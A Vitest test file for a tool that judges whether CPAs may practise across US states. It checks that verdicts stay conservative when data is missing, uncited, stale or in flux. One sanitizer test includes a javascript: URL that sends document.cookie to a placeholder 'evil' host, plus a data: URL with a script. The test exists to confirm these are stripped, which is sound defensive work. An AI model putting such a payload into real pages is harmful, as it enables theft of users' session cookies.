import { describe, it, expect } from "vitest";
import {
  evaluateMobility,
  evaluateIndividualMobility,
  evaluateFirmRegistration,
  isValidServiceType,
  normalizeRuleRow,
  MOBILITY_DISCLAIMER,
  type MobilityInput,
  type MobilityRuleRow,
} from "../src/mobility";

/** A fully-verified, permissive rule -- the ONLY shape that should ever be
 * able to produce a "clear" verdict. */
function verifiedPermissiveRule(over: Partial<MobilityRuleRow> = {}): MobilityRuleRow {
  return {
    state: "Texas",
    state_slug: "texas",
    individual_practice_privilege: true,
    notice_required: false,
    fee_required: false,
    firm_registration_attest: false,
    firm_registration_tax: false,
    peer_review_required: false,
    citation: "Tex. Occ. Code s 901.462",
    citation_url: "https://example.gov/statute",
    source_url: "https://example.gov/board",
    verified_date: new Date().toISOString().slice(0, 10),
    confidence: "dual_source",
    data_gap_note: null,
    notes: null,
    equivalence_test: "individual_criteria",
    rule_in_flux: false,
    flux_note: null,
    rule_changes_on: null,
    ...over,
  };
}

function input(over: Partial<MobilityInput> = {}): MobilityInput {
  return {
    homeStateSlug: "california",
    targetStateSlug: "texas",
    serviceType: "tax",
    licenseInGoodStanding: true,
    substantiallyEquivalent: true,
    ...over,
  };
}

describe("SAFETY: the engine must never assert a clearance it cannot cite", () => {
  it("downgrades a would-be CLEAR verdict to not_verified when the rule has NO citation", () => {
    // The dangerous case is not a MISSING state -- it's a PRESENT state
    // whose booleans were filled in without a source. The engine must
    // refuse to go green on that rather than relying on data review.
    const uncited = verifiedPermissiveRule({ citation: null });
    const res = evaluateMobility(input(), uncited);
    expect(res.individual.verdict).toBe("not_verified");
    expect(res.firm.verdict).toBe("not_verified");
    expect(res.overall).toBe("not_verified");
  });

  it("returns not_verified -- never clear -- for a state absent from the dataset", () => {
    const res = evaluateMobility(input(), null);
    expect(res.individual.verdict).toBe("not_verified");
    expect(res.firm.verdict).toBe("not_verified");
    expect(res.overall).toBe("not_verified");
  });

  it("treats EVERY null field as unknown, never as permission", () => {
    // Exhaustive: null any single field that feeds a determination and
    // confirm none of them yields "clear".
    // Each field is paired with the service type it actually governs --
    // nulling the tax field while asking about attest is correctly
    // irrelevant, and asserting otherwise would be testing a property the
    // engine should not have.
    const cases: Array<[keyof MobilityRuleRow, "attest" | "tax"]> = [
      ["individual_practice_privilege", "tax"],
      ["notice_required", "tax"],
      ["fee_required", "tax"],
      ["firm_registration_attest", "attest"],
      ["firm_registration_tax", "tax"],
    ];
    for (const [field, serviceType] of cases) {
      const rule = verifiedPermissiveRule({ [field]: null } as Partial<MobilityRuleRow>);
      const res = evaluateMobility(input({ serviceType }), rule);
      expect(res.overall, `null ${field} must not produce a permissive verdict`).not.toBe("clear");
    }
  });

  it("never emits a permissive verdict for a rule that is entirely unverified", () => {
    const blank: MobilityRuleRow = {
      state: "Nowhere",
      state_slug: "nowhere",
      individual_practice_privilege: null,
      notice_required: null,
      fee_required: null,
      firm_registration_attest: null,
      firm_registration_tax: null,
      peer_review_required: null,
      citation: null,
      citation_url: null,
      source_url: null,
      verified_date: null,
      confidence: "unverified",
      data_gap_note: "Nothing verified yet.",
      notes: null,
      equivalence_test: null,
      rule_in_flux: null,
      flux_note: null,
      rule_changes_on: null,
    };
    const res = evaluateMobility(input(), blank);
    expect(res.overall).toBe("not_verified");
  });

  it("attaches the not-legal-advice disclaimer to EVERY finding, on every path", () => {
    const cases: Array<[MobilityInput, MobilityRuleRow | null]> = [
      [input(), verifiedPermissiveRule()],
      [input(), null],
      [input({ licenseInGoodStanding: false }), verifiedPermissiveRule()],
      [input({ substantiallyEquivalent: false }), verifiedPermissiveRule()],
      [input({ targetStateSlug: "california" }), verifiedPermissiveRule()],
      [input({ serviceType: "attest" }), verifiedPermissiveRule({ firm_registration_attest: true })],
    ];
    for (const [inp, rule] of cases) {
      const res = evaluateMobility(inp, rule);
      expect(res.individual.disclaimer).toBe(MOBILITY_DISCLAIMER);
      expect(res.firm.disclaimer).toBe(MOBILITY_DISCLAIMER);
    }
  });

  it("the overall verdict is never greener than its parts", () => {
    const rule = verifiedPermissiveRule({ firm_registration_attest: true });
    const res = evaluateMobility(input({ serviceType: "attest" }), rule);
    expect(res.individual.verdict).toBe("clear");
    expect(res.firm.verdict).toBe("action_required");
    expect(res.overall).toBe("action_required"); // not "clear"
  });
});

describe("individual practice privilege", () => {
  it("is clear only when verified, cited, and unconditional", () => {
    const res = evaluateIndividualMobility(input(), verifiedPermissiveRule());
    expect(res.verdict).toBe("clear");
    expect(res.citation).toBeTruthy();
  });

  it("checks the practitioner's OWN standing before the state's rule", () => {
    // Telling someone "this state allows mobility" when they aren't in
    // good standing is technically true and practically dangerous.
    const notGood = evaluateIndividualMobility(
      input({ licenseInGoodStanding: false }),
      verifiedPermissiveRule()
    );
    expect(notGood.verdict).toBe("action_required");
    expect(notGood.requirements.join(" ")).toMatch(/good standing/i);

    const notEquivalent = evaluateIndividualMobility(
      input({ substantiallyEquivalent: false }),
      verifiedPermissiveRule()
    );
    expect(notEquivalent.verdict).toBe("action_required");
  });

  it("reports conditions when notice or a fee is required", () => {
    const res = evaluateIndividualMobility(input(), verifiedPermissiveRule({ notice_required: true }));
    expect(res.verdict).toBe("action_required");
    expect(res.requirements.join(" ")).toMatch(/notice/i);
  });

  it("says NOT VERIFIED -- not 'no notice needed' -- when the notice rule is unknown", () => {
    // "We didn't find a notice requirement" is not the same claim as
    // "there is none", and only one of them is honest.
    const res = evaluateIndividualMobility(input(), verifiedPermissiveRule({ notice_required: null }));
    expect(res.verdict).toBe("not_verified");
    expect(res.requirements.join(" ")).toMatch(/not verified/i);
  });

  it("flags a state that does not extend practice privilege", () => {
    const res = evaluateIndividualMobility(
      input(),
      verifiedPermissiveRule({ individual_practice_privilege: false })
    );
    expect(res.verdict).toBe("action_required");
    expect(res.summary).toMatch(/does not extend/i);
  });

  it("treats home state as not-applicable rather than granting anything", () => {
    // Was asserted as "not_verified" until 2026-07-30 review pointed out
    // that conflates "we lack data" with "the question doesn't apply" --
    // and the UI then told a CPA we had no verified information about
    // their OWN home state, which is false and alarming.
    const res = evaluateIndividualMobility(input({ targetStateSlug: "california" }), verifiedPermissiveRule());
    expect(res.verdict).toBe("not_applicable");
    expect(res.summary).toMatch(/home state/i);
  });
});

describe("firm registration -- attest vs tax is the distinction that matters", () => {
  it("requires registration for ATTEST while TAX is clear, on the same state", () => {
    // The most common real-world mobility mistake: the individual has
    // practice privilege but the FIRM still must register for attest work.
    const rule = verifiedPermissiveRule({
      firm_registration_attest: true,
      firm_registration_tax: false,
    });
    expect(evaluateFirmRegistration(input({ serviceType: "attest" }), rule).verdict).toBe("action_required");
    expect(evaluateFirmRegistration(input({ serviceType: "tax" }), rule).verdict).toBe("clear");
  });

  it("surfaces peer review as a condition of registration", () => {
    const rule = verifiedPermissiveRule({ firm_registration_attest: true, peer_review_required: true });
    const res = evaluateFirmRegistration(input({ serviceType: "attest" }), rule);
    expect(res.requirements.join(" ")).toMatch(/peer review/i);
  });

  it("says peer review is UNVERIFIED rather than omitting it when unknown", () => {
    const rule = verifiedPermissiveRule({ firm_registration_attest: true, peer_review_required: null });
    const res = evaluateFirmRegistration(input({ serviceType: "attest" }), rule);
    expect(res.requirements.join(" ")).toMatch(/not verified/i);
  });


  it("does NOT borrow the tax rule for other non-attest services", () => {
    // Consulting/advisory treatment genuinely varies by state. Resolving it
    // to the tax answer would be inferring one service's rule from
    // another's -- the same error the research brief forbids in the data.
    const rule = verifiedPermissiveRule({ firm_registration_tax: false });
    expect(evaluateFirmRegistration(input({ serviceType: "tax" }), rule).verdict).toBe("clear");
    const other = evaluateFirmRegistration(input({ serviceType: "other_non_attest" }), rule);
    expect(other.verdict).toBe("not_verified");
    expect(other.requirements.join(" ")).toMatch(/won't infer|confirm with the board/i);
  });

  it("does not let a tax-service answer leak into an attest question", () => {
    // If attest is unverified, asking about attest must NOT fall back to
    // the (verified, permissive) tax answer.
    const rule = verifiedPermissiveRule({ firm_registration_attest: null, firm_registration_tax: false });
    expect(evaluateFirmRegistration(input({ serviceType: "attest" }), rule).verdict).toBe("not_verified");
    expect(evaluateFirmRegistration(input({ serviceType: "tax" }), rule).verdict).toBe("clear");
  });
});

describe("service type validation", () => {
  it("accepts exactly the three real service types", () => {
    expect(isValidServiceType("attest")).toBe(true);
    expect(isValidServiceType("tax")).toBe(true);
    expect(isValidServiceType("other_non_attest")).toBe(true);
  });

  it("rejects anything else, including prototype keys", () => {
    for (const bad of ["", "audit", "ATTEST", "constructor", "__proto__", "toString"]) {
      expect(isValidServiceType(bad)).toBe(false);
    }
  });
});

describe("SAFETY: rules that are in flux, stale, or of an unknown test kind", () => {
  it("refuses to answer when the state's rule is IN FLUX, even if every other field is verified", () => {
    // Illinois, 2026-07-30: the enrolled Public Act and the compiled
    // statute state DIFFERENT tests for the same section, and the compiled
    // text cites the very act that contradicts it. Picking a side would be
    // worse than declining.
    const rule = verifiedPermissiveRule({
      rule_in_flux: true,
      flux_note: "P.A. 104-0228 and the compiled ILCS text disagree on the 5.2(a)(1) test.",
    });
    const res = evaluateMobility(input(), rule);
    expect(res.individual.verdict).toBe("not_verified");
    expect(res.firm.verdict).toBe("not_verified");
    expect(res.individual.requirements.join(" ")).toMatch(/disagree|transition|104-0228/i);
  });

  it("refuses to answer when verification is older than the TTL", () => {
    // Four of five priority states changed mobility rules inside a
    // 14-month window, so a stale row is a live hazard, not a nit.
    const stale = verifiedPermissiveRule({ verified_date: "2020-01-01" });
    const res = evaluateMobility(input(), stale);
    expect(res.overall).toBe("not_verified");
    expect(res.individual.requirements.join(" ")).toMatch(/verified/i);
  });

  it("treats a missing or unparseable verified_date as stale, not as fresh", () => {
    for (const d of [null, "", "not-a-date"]) {
      const rule = verifiedPermissiveRule({ verified_date: d as string | null });
      expect(evaluateMobility(input(), rule).overall, `verified_date ${JSON.stringify(d)}`).toBe(
        "not_verified"
      );
    }
  });

  it("refuses when we don't know WHICH substantial-equivalence test the state applies", () => {
    // A state-level NASBA determination and an individual-criteria test are
    // different questions. Interpreting the user's one attestation against
    // the wrong one is silent wrongness.
    const res = evaluateIndividualMobility(input(), verifiedPermissiveRule({ equivalence_test: null }));
    expect(res.verdict).toBe("not_verified");
    expect(res.requirements.join(" ")).toMatch(/substantial-equivalence test/i);
  });

  it("still answers for a state whose test kind IS known", () => {
    for (const kind of ["nasba_state_level", "individual_criteria"] as const) {
      const res = evaluateIndividualMobility(input(), verifiedPermissiveRule({ equivalence_test: kind }));
      expect(res.verdict, `test kind ${kind}`).toBe("clear");
    }
  });

  it("the flux block cannot be bypassed via the firm path", () => {
    const rule = verifiedPermissiveRule({ rule_in_flux: true, firm_registration_tax: false });
    expect(evaluateFirmRegistration(input({ serviceType: "tax" }), rule).verdict).toBe("not_verified");
  });
});

describe("flux SEVERITY split (2026-08-03): rule_changes_on vs today, not one blanket boolean", () => {
  it("a flux rule with a PAST rule_changes_on answers for real, with a recent-change caveat appended", () => {
    const rule = verifiedPermissiveRule({
      rule_in_flux: true,
      rule_changes_on: "2026-01-01", // settled well before "now"
      flux_note: "Some now-irrelevant description of the prior disagreement.",
    });
    const res = evaluateMobility(input(), rule);
    expect(res.individual.verdict).toBe("clear");
    expect(res.overall).toBe("clear");
    expect(res.individual.requirements.join(" ")).toMatch(/changed on 2026-01-01/i);
    // The stale flux_note text must NOT leak into a settled answer.
    expect(res.individual.requirements.join(" ")).not.toMatch(/now-irrelevant/i);
  });

  it("a flux rule with a FUTURE rule_changes_on still blocks -- the change hasn't happened yet", () => {
    const future = new Date(Date.now() + 30 * 86_400_000).toISOString().slice(0, 10);
    const rule = verifiedPermissiveRule({ rule_in_flux: true, rule_changes_on: future });
    const res = evaluateMobility(input(), rule);
    expect(res.overall).toBe("not_verified");
  });

  it("a flux rule due to change TODAY already counts as settled (effective ON its change date, not after)", () => {
    const today = new Date().toISOString().slice(0, 10);
    const rule = verifiedPermissiveRule({ rule_in_flux: true, rule_changes_on: today });
    const res = evaluateMobility(input(), rule);
    expect(res.overall).toBe("clear");
  });

  it("a settled flux rule that would ALSO be not_verified for its own reasons never gets the caveat appended", () => {
    // e.g. equivalence_test still unknown -- the not_verified requirements
    // already explain the real gap; a second note about a settled date
    // would read as confused, not careful.
    const rule = verifiedPermissiveRule({
      rule_in_flux: true,
      rule_changes_on: "2026-01-01",
      equivalence_test: null,
    });
    const res = evaluateIndividualMobility(input(), rule);
    expect(res.verdict).toBe("not_verified");
    expect(res.requirements.join(" ")).not.toMatch(/changed on/i);
  });

  it("an undated flux rule (source disagreement, no fixed date) never counts as settled", () => {
    const rule = verifiedPermissiveRule({ rule_in_flux: true, rule_changes_on: null });
    expect(evaluateMobility(input(), rule).overall).toBe("not_verified");
  });

  it("the home-state (not_applicable) branch never gets the caveat -- flux doesn't apply to your own state", () => {
    const rule = verifiedPermissiveRule({ rule_in_flux: true, rule_changes_on: "2026-01-01" });
    const res = evaluateIndividualMobility(input({ homeStateSlug: "texas", targetStateSlug: "texas" }), rule);
    expect(res.verdict).toBe("not_applicable");
    expect(res.requirements).toHaveLength(0);
  });
});

describe("REGRESSION: the critical undefined-is-not-null defect (2026-07-30 review)", () => {
  it("an OMITTED field must NOT produce a permissive verdict -- reproduced over HTTP before the fix", () => {
    // The natural failure: a researcher adds a state with the citation they
    // found and omits the fields they could not verify (the obvious reading
    // of "when in doubt, leave it null"). Every guard was `=== null`, so
    // `undefined` sailed past both it and the `=== false` check into the
    // permissive branch -- yielding "practice privilege exists, no notice
    // or fee" from a row that verified none of it.
    const partial = normalizeRuleRow({
      state: "Texas",
      state_slug: "texas",
      citation: "Tex. Occ. Code s 901.462",
      citation_url: "https://example.gov/s",
      source_url: "https://example.gov/b",
      verified_date: new Date().toISOString().slice(0, 10),
      confidence: "single_source",
      // every determination field omitted
    });
    expect(partial).not.toBeNull();
    const res = evaluateMobility(input(), partial);
    expect(res.overall).toBe("not_verified");
    expect(res.individual.verdict).toBe("not_verified");
  });

  it("normalizes NON-BOOLEAN truthy/falsy values to null rather than trusting them", () => {
    // "false" (string) previously produced CLEAR with a "state extends
    // practice privilege" summary -- from a row that literally said no.
    for (const bogus of ["false", "true", 1, 0, "yes", {}, []]) {
      const row = normalizeRuleRow({
        state_slug: "texas",
        individual_practice_privilege: bogus,
        notice_required: bogus,
        fee_required: bogus,
        citation: "Tex. Occ. Code s 901.462",
        verified_date: new Date().toISOString().slice(0, 10),
        equivalence_test: "individual_criteria",
        rule_in_flux: false,
      });
      expect(row!.individual_practice_privilege, `value ${JSON.stringify(bogus)}`).toBeNull();
      expect(evaluateMobility(input(), row).overall).toBe("not_verified");
    }
  });

  it("preserves genuine booleans", () => {
    const row = normalizeRuleRow({
      state_slug: "texas",
      individual_practice_privilege: true,
      notice_required: false,
      citation: "Tex. Occ. Code s 901.462",
    });
    expect(row!.individual_practice_privilege).toBe(true);
    expect(row!.notice_required).toBe(false);
  });

  it("drops a row with no usable state_slug entirely", () => {
    for (const bad of [null, undefined, "string", [], {}, { state_slug: "" }, { state_slug: 5 }]) {
      expect(normalizeRuleRow(bad)).toBeNull();
    }
  });
});

describe("REGRESSION: placeholder citations and unsafe URLs", () => {
  it("a whitespace or placeholder citation cannot certify a CLEAR verdict", () => {
    // The guard was a truthiness test, so "   ", "TBD", "pending" all
    // satisfied it -- exactly the placeholder-as-source case it warned of.
    for (const c of ["   ", "TBD", "pending", "-", "n/a", "??", "unknown"]) {
      const rule = verifiedPermissiveRule({ citation: c });
      expect(evaluateMobility(input(), rule).overall, `citation ${JSON.stringify(c)}`).toBe("not_verified");
    }
  });

  it("still accepts a real citation", () => {
    expect(evaluateMobility(input(), verifiedPermissiveRule()).overall).toBe("clear");
  });

  it("strips javascript: and data: URLs -- HTML-escaping does NOT stop them in an href", () => {
    const row = normalizeRuleRow({
      state_slug: "texas",
      citation: "Tex. Occ. Code s 901.462",
      citation_url: "javascript:fetch('https://evil/'+document.cookie)",
      source_url: "data:text/html,<script>alert(1)</script>",
    });
    expect(row!.citation_url).toBeNull();
    expect(row!.source_url).toBeNull();
  });

  it("keeps http and https URLs", () => {
    const row = normalizeRuleRow({
      state_slug: "texas",
      citation_url: "https://ilga.gov/x",
      source_url: "http://board.example.gov/y",
    });
    expect(row!.citation_url).toBe("https://ilga.gov/x");
    expect(row!.source_url).toBe("http://board.example.gov/y");
  });
});

describe("REGRESSION: verdict semantics", () => {
  it("home state is NOT_APPLICABLE, not 'not verified' -- we are not claiming ignorance of their own state", () => {
    const res = evaluateMobility(input({ targetStateSlug: "california" }), verifiedPermissiveRule());
    expect(res.individual.verdict).toBe("not_applicable");
    expect(res.firm.verdict).toBe("not_applicable");
    expect(res.overall).toBe("not_applicable");
  });

  it("not_verified now OUTRANKS action_required in the overall verdict", () => {
    // action_required implies we evaluated the state ("do X and you're
    // set"), a stronger claim than we can make when any part is unverified.
    const res = evaluateMobility(input({ licenseInGoodStanding: false }), null);
    expect(res.individual.verdict).toBe("action_required");
    expect(res.firm.verdict).toBe("not_verified");
    expect(res.overall).toBe("not_verified");
  });

  it("a downgraded finding carries NO provenance", () => {
    const rule = verifiedPermissiveRule({ citation: "TBD", confidence: "single_source" });
    const res = evaluateIndividualMobility(input(), rule);
    expect(res.verdict).toBe("not_verified");
    expect(res.confidence).toBeNull();
    expect(res.citationUrl).toBeNull();
    expect(res.sourceUrl).toBeNull();
  });
});
